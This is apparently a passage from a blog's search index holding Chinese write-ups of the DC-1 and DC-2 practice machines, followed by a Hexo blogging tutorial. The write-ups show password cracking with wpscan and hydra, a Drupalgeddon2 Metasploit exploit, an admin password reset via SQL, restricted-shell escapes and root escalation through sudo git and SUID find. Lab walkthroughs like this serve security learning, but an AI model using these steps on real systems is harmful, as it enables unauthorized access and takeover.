class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wpscan –-url dc-2/ -P dict.txt #使用字典dict.txt破解所有用户密码</span><br><span class="line"></span><br><span class="line">[i] Valid Combinations Found:</span><br><span class="line"> Username: jerry, Password: adipiscing</span><br><span class="line"> Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p><img src="/images/DC-2/1574129738314.png" alt="1574129738314"></p><h3 id="5、找到登录页面进行登录"><a href="#5、找到登录页面进行登录" class="headerlink" title="5、找到登录页面进行登录"></a>5、找到登录页面进行登录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问 http://dc-2/wp-admin #出现登录界面</span><br></pre></td></tr></table></figure><p><img src="/images/DC-2/1574129966981.png" alt="1574129966981"></p><ul><li>登陆后搜索flag，发现<strong>flag2</strong></li></ul><p><img src="/images/DC-2/1574131707472.png" alt="1574131707472"></p><h3 id="6、利用tom用户名密码ssh登录"><a href="#6、利用tom用户名密码ssh登录" class="headerlink" title="6、利用tom用户名密码ssh登录"></a>6、利用tom用户名密码ssh登录</h3><p><img src="/images/DC-2/1574131922571.png" alt="1574131922571"></p><ul><li>cat 命令不能使用</li><li>测试发现可以使用vi，查看<strong>flag3</strong></li><li>提示使用su命令，测试发现shell受限</li></ul><p><img src="/images/DC-2/1574131992783.png" alt="1574131992783"></p><p><img src="/images/DC-2/1574132138637.png" alt="1574132138637"></p><h3 id="7、修改环境变量-切换shell"><a href="#7、修改环境变量-切换shell" class="headerlink" title="7、修改环境变量 切换shell"></a>7、修改环境变量 切换shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a </span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure><p><img src="/images/DC-2/1574133373299.png" alt="1574133373299"></p><p><strong>参考</strong></p><p> <a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a> </p><h3 id="8、切换到jerry用户，找到flag4"><a href="#8、切换到jerry用户，找到flag4" class="headerlink" title="8、切换到jerry用户，找到flag4"></a>8、切换到jerry用户，找到flag4</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line">cd /home/jerry</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure><p><img src="/images/DC-2/1574133698223.png" alt="1574133698223"></p><h3 id="9、查看能够使用的root权限命令"><a href="#9、查看能够使用的root权限命令" class="headerlink" title="9、查看能够使用的root权限命令"></a>9、查看能够使用的root权限命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l # 发现git</span><br></pre></td></tr></table></figure><p><img src="/images/DC-2/1574134348644.png" alt="1574134348644"></p><h3 id="10、git提权"><a href="#10、git提权" class="headerlink" title="10、git提权"></a>10、git提权</h3><p>git有一个缓冲区溢出漏洞，在使用sudo git -p –help时，不需要输入root密码即可以root权限执行这条命令。我们尽量减小缓冲区的行数，使其一次性显示不完这条命令的回显结果，这样这条命令就一直处于运行状态，加上此时处于root权限，我们直接在这时候打开bash shell，直接提权至root。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p --help</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><p><img src="/images/DC-2/1574133785339.png" alt="1574133785339"></p><p><img src="/images/DC-2/1574133800149.png" alt="1574133800149"></p><p><strong>参考</strong></p><p> <a href="https://gtfobins.github.io/gtfobins/git/#limited-suid" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/git/#limited-suid</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1</title>
      <link href="/2019/11/20/DC-1/"/>
      <url>/2019/11/20/DC-1/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="打靶流程"><a href="#打靶流程" class="headerlink" title="打靶流程"></a>打靶流程</h3><h5 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h5><p><img src="/images/DC-1/1571743256900.png" alt="1571743256900"></p><p>发现80端口开放</p><h5 id="2、访问"><a href="#2、访问" class="headerlink" title="2、访问"></a>2、访问</h5><p><img src="/images/DC-1/1571743296064.png" alt="1571743296064"></p><p>发现为Drupal CMS</p><h5 id="3、御剑扫描目录"><a href="#3、御剑扫描目录" class="headerlink" title="3、御剑扫描目录"></a>3、御剑扫描目录</h5><p><img src="/images/DC-1/1571743349794.png" alt="1571743349794"></p><h5 id="4、-MSF-搜索是否有可用的Exp"><a href="#4、-MSF-搜索是否有可用的Exp" class="headerlink" title="4、###MSF 搜索是否有可用的Exp"></a>4、###MSF 搜索是否有可用的Exp</h5><p><img src="/images/DC-1/1571744035120.png" alt="1571744035120"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set rhost &lt;remote ip&gt;</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h6 id="设置rhost"><a href="#设置rhost" class="headerlink" title="设置rhost"></a>设置rhost</h6><p><img src="/images/DC-1/1571744086888.png" alt="1571744086888"></p><h6 id="run-getshell"><a href="#run-getshell" class="headerlink" title="run getshell"></a>run getshell</h6><p><img src="/images/DC-1/1571744114319.png" alt="1571744114319"></p><h5 id="查看文件——获得第一个flag"><a href="#查看文件——获得第一个flag" class="headerlink" title="查看文件——获得第一个flag"></a>查看文件——获得第一个flag</h5><p><img src="/images/DC-1/1571744256003.png" alt="1571744256003"></p><h5 id="提示配置文件"><a href="#提示配置文件" class="headerlink" title="提示配置文件"></a>提示配置文件</h5><p><img src="/images/DC-1/1571744283570.png" alt="1571744283570"></p><h5 id="找到配置文件"><a href="#找到配置文件" class="headerlink" title="找到配置文件"></a>找到配置文件</h5><p><img src="/images/DC-1/1571748462121.png" alt="1571748462121"></p><p><img src="/images/DC-1/1571748484756.png" alt="1571748484756"></p><h4 id="利用python得到标准shell"><a href="#利用python得到标准shell" class="headerlink" title="利用python得到标准shell"></a>利用python得到标准shell</h4><p><img src="/images/DC-1/1571748547634.png" alt="1571748547634"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/bash')"</span><br></pre></td></tr></table></figure><h5 id="登录mysql"><a href="#登录mysql" class="headerlink" title="登录mysql"></a>登录mysql</h5><p><img src="/images/DC-1/1571748710717.png" alt="1571748710717"></p><p><img src="/images/DC-1/1571748781907.png" alt="1571748781907"></p><p><img src="/images/DC-1/1571748802886.png" alt="1571748802886"></p><p><img src="/images/DC-1/1571748838261.png" alt="1571748838261"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改密码 将密码重置为password</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> pass=<span class="string">'$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4'</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'admin'</span>;</span><br></pre></td></tr></table></figure><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p><img src="/images/DC-1/1571795230256.png" alt="1571795230256"></p><p><img src="/images/DC-1/1571795256714.png" alt="1571795256714"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /Users/john-1.8.0/run/password.lst -vV 192.168.1.133 ssh</span><br></pre></td></tr></table></figure><p><img src="/images/DC-1/1571795423693.png" alt="1571795423693"></p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="/images/DC-1/1571795098147.png" alt="1571795098147"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br><span class="line">touch getflag</span><br><span class="line">find / -type f -name getflag -exec "whoami" \;</span><br><span class="line">find / -type f -name getflag -exec "/bin/sh" \;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+Typora+git写博客</title>
      <link href="/2019/11/20/hexo-Typora-git%E5%86%99%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/11/20/hexo-Typora-git%E5%86%99%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="安装必要的软件"><a href="#安装必要的软件" class="headerlink" title="安装必要的软件"></a>安装必要的软件</h2><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><h3 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h3><h3 id="安装Typora"><a href="#安装Typora" class="headerlink" title="安装Typora"></a>安装Typora</h3><h2 id="创建本地hexo项目"><a href="#创建本地hexo项目" class="headerlink" title="创建本地hexo项目"></a>创建本地hexo项目</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>1、直接创建项目</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog <span class="comment"># blog为放置博客的文件夹</span></span><br><span class="line">cd blog</span><br></pre></td></tr></table></figure><p> 2、创建文件夹，进入文件夹所在目录，执行init</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd blog</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>以上语句执行完毕后， 你会在blog文件夹里看到如下: </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── _config.yml <span class="comment">//网站的配置信息，您可以在此配置大部分的参数。 </span></span><br><span class="line">├── <span class="keyword">package</span>.json </span><br><span class="line">├── scaffolds <span class="comment">//模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。 </span></span><br><span class="line">├── source <span class="comment">//资源文件夹是存放用户资源的地方。</span></span><br><span class="line"> | ├── _drafts</span><br><span class="line"> | └── _posts </span><br><span class="line">└── themes <span class="comment">//主题文件夹。Hexo会根据主题来生成静态页面</span></span><br></pre></td></tr></table></figure><h3 id="创建文章"><a href="#创建文章" class="headerlink" title="创建文章"></a>创建文章</h3><p> 1、新建一篇文章（我的第一篇文章） </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new helloworld</span><br></pre></td></tr></table></figure><p> 会在/source/_post里自动生成了“helloworld.md”文件，之后新建的文章都将存放在此目录下。编辑“helloworld.md”文件可修改内容。 </p><p>2、生成网站</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate <span class="comment">#可简写成 hexo g</span></span><br></pre></td></tr></table></figure><p>3、启动本地服务器（可不执行hexo g，直接执行hexo s，会自动生成网站）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server <span class="comment">#可简写成 hexo s</span></span><br></pre></td></tr></table></figure><p>4、在浏览器输入  <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000</a> 即可查看网站</p><p><code>https://github.com/t0ng2333/t0ng2333.github.io</code></p><h2 id="部署文章至github"><a href="#部署文章至github" class="headerlink" title="部署文章至github"></a>部署文章至github</h2><h3 id="在github上创建个人仓库"><a href="#在github上创建个人仓库" class="headerlink" title="在github上创建个人仓库"></a>在github上创建个人仓库</h3><p> 在项目根目录下找到 <code>_congif.yml</code>，找到 <code>deploy</code> 字段并填写完整 </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">'git'</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:t0ng2333/t0ng2333.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>安装推送工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>执行推送命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 生产力工具 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
